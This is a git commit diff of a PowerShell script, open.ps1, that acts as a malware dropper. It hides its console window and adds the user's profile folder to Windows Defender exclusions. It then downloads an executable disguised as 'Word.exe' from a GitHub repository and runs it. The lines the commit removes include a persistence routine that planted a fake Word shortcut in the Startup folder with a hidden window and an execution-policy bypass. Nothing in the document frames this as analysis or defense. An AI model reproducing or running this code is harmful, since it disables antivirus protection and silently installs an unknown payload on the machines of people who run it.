84722653df25490b5ecbb890bd4975a5d8aeb030
MrRoyal1235 <94418680+MrRoyal1235@users.noreply.github.com>
2024-10-05 12:45:00 +0700

    Update open.ps1

--- open.ps1
+++ open.ps1
@@ -8,48 +8,16 @@ public static extern IntPtr GetConsoleWindow();
 [DllImport("user32.dll")]
 public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
 '
-
-function Hide-Console {
+function Hide-Console
+{
     $consolePtr = [Console.Window]::GetConsoleWindow()
+    #0 hide
     [Console.Window]::ShowWindow($consolePtr, 0)
 }
-
-function Test-InternetConnection {
-    try {
-        $pingResult = Test-Connection -ComputerName 8.8.8.8 -Count 1 -Quiet
-        return $pingResult
-    } catch {
-        return $false
-    }
-}
-
-function Wait-ForInternet {
-    while (-not (Test-InternetConnection)) {
-        Start-Sleep -Seconds 10
-    }
-}
-
-function Add-ToStartup {
-    $scriptPath = $MyInvocation.MyCommand.Definition
-    $startupFolder = [System.IO.Path]::Combine($env:AppData, "Microsoft\Windows\Start Menu\Programs\Startup")
-    $WshShell = New-Object -ComObject WScript.Shell
-    $shortcut = $WshShell.CreateShortcut("$startupFolder\Word.lnk")
-    $shortcut.TargetPath = "Word.exe"
-    $shortcut.Arguments = "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
-    $shortcut.Save()
-}
-
 Hide-Console
-
-Add-ToStartup
-
 Add-MpPreference -ExclusionPath $env:USERPROFILE
-
 $url = 'https://github.com/MrRoyal1235/checkaccvjppro/raw/main/Word.exe'
 $outputFile = [System.IO.Path]::Combine($env:Temp, 'Word.exe')
-
-Wait-ForInternet
-
+Start-Sleep -Milliseconds 100 
 Invoke-WebRequest -Uri $url -OutFile $outputFile
-
 Start-Process -FilePath $outputFile
